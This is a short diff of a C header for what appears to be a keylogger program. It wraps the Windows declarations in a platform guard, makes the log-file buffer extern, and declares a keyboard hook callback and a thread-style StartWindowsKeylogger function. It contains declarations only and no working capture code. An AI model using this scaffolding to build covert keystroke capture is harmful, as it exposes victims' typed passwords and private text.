@@ -12,13 +12,14 @@
 
 
 // windows 
-
-const char keyloggerfile[256];
+#ifdef _WIN32
+extern const char keyloggerfile[256];
 LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
-void* StartWindowsKeylogger();
+void* StartWindowsKeylogger(void* arg);
 
 // linux
+#endif
 
 
 #endif
